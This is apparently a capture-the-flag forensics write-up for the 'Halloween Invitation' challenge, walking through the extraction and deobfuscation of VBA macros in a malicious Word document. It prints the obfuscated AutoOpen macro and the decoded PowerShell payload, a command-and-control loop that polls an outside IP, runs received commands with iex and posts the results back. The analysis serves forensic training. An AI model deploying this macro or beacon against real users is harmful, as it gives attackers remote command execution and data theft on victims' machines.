# Hack The Boo 2022

## Halloween Invitation

> An email notification pops up. It's from your theater group. Someone decided to throw a party. The invitation looks awesome, but there is something suspicious about this document. Maybe you should take a look before you rent your banana costume.
>
>  Author: N/A
>
> [`forensics_halloween_invitation.zip`](forensics_halloween_invitation.zip)

Tags: _forensics_

## Preparation

This challenge is provided with a MS-Word document. After extracting the conents with *unzip* and inspecting the file structure one can see remnants of visual basic macros. 

With *olevba* the code can be extracted:

```
$ olevba invitation.docm
olevba 0.60.1 on Python 3.10.4 - http://decalage.info/python/oletools
===============================================================================
FILE: invitation.docm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
odhsjwpphlxnb
Call lmavedb
End Sub
Private Sub odhsjwpphlxnb()
Dim bnhupraoau As String
CreateObject("WScript.Shell").currentdirectory = Environ("TEMP")
bnhupraoau = sryivxjsdncj()
dropPath = Environ("TEMP")
Set rxnnvnfqufrzqfhnff = CreateObject(uxdufnkjlialsyp("53637269707469") & uxdufnkjlialsyp("6e672e46696c6553797374656d4f626a656374"))
Set dfdjqgaqhvxxi = rxnnvnfqufrzqfhnff.CreateTextFile(dropPath & uxdufnkjlialsyp("5c68697374") & uxdufnkjlialsyp("6f72792e62616b"), True)
dfdjqgaqhvxxi.Write bnhupraoau
dfdjqgaqhvxxi.Close
End Sub
/// snip ///
```

This looks like a lot of obfuscated code. Some de-obfuscation is needed to clear things up a bit. A couple of functions stand out:

```
Function uxdufnkjlialsyp(ByVal tiyrahvbz As String) As String
    Dim nqjveawetp As Long
    For nqjveawetp = 1 To Len(tiyrahvbz) Step 2
        uxdufnkjlialsyp = uxdufnkjlialsyp & Chr$(Val("&H" & Mid$(tiyrahvbz, nqjveawetp, 2)))
    Next nqjveawetp
End Function

Private Function wdysllqkgsbzs(strBytes) As String
    Dim aNumbers
    Dim fxnrfzsdxmcvranp As String
    Dim iIter
    fxnrfzsdxmcvranp = ""
    aNumbers = Split(strBytes)
    For iIter = LBound(aNumbers) To UBound(aNumbers)
        fxnrfzsdxmcvranp = fxnrfzsdxmcvranp + Chr(aNumbers(iIter))
    Next
    wdysllqkgsbzs = fxnrfzsdxmcvranp
End Function
```

Clearning this up a bit and translating this to python

```python
def hex2str(val):
    result = ""
    for i in range(0, len(val)-1, 2):
        result += chr(int(val[i:i+2],16))
    return result

def bytes2str(val):
    numbers = val.split()
    result = ""
    for n in numbers:
        result += chr(int(n,10))
    return result
```

The first function transforms a hex-string to string and is widely used to obfuscate strings, the second function transforms a array of bytes to string. Replacing the names and some of the variables sheds a bit more light into the dark. Also another function stands out

```
Private Function okbzichkqtto() As String
    Dim result As String
    result = ""
    result = result + bytes2str(hex2str("3734203635203636203132322036352036382034382036352037342031") & hex2str("31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033"))
    result = result + bytes2str(hex2str("363520313230203635203638203130") & hex2str("37203635203739203635203635203131372036352036382038352036352037372031303320363520353420363520363820313033203635203737203635203635203532"))
    result = result + bytes2str(hex2str("3635203638203635203635203734") & hex2str("20313139203635203535203635203637203831203635203937203831203635203537203635203637203939203635203930203635203635203438203635203638203737"))
    result = result + bytes2str(hex2str("3635203839203130332036362031303620363520373120373720363520373820313033203636203130372036352036") & hex2str("37203438203635203737203635203635203438203635203638203737203635203930"))
    /// snip ///
End Function
```

Here a large string is created. This could be interesting, to look into this, this can be put into python with some syntax adaptations. The output is base64 encoded

```
$ ./utils.py
JABzAD0AJwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAZAA0ADMAYgBjAGMANgBkAC0AMAA0ADMAZgAyADQAMAA5AC0ANwBlAGEAMgAzAGEAMgBjACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGQANAAzAGIAYwBjADYAZAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMAA0ADMAZgAyADQAMAA5ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AKQA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABwACQAcwAvADcAZQBhADIAMwBhADIAYwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0ASABUAEIAewA1AHUAcAAzAHIAXwAzADQANQB5AF8AbQA0AGMAcgAwADUAfQA=
```

So again, but this time base64 decoded, reveals the flag attached to some payload.

```
./utils.py | base64 -d
$s='77.74.198.52:8080';$i='d43bcc6d-043f2409-7ea23a2c';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/d43bcc6d -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/043f2409 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/7ea23a2c -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}HTB{5up3r_345y_m4cr05}
```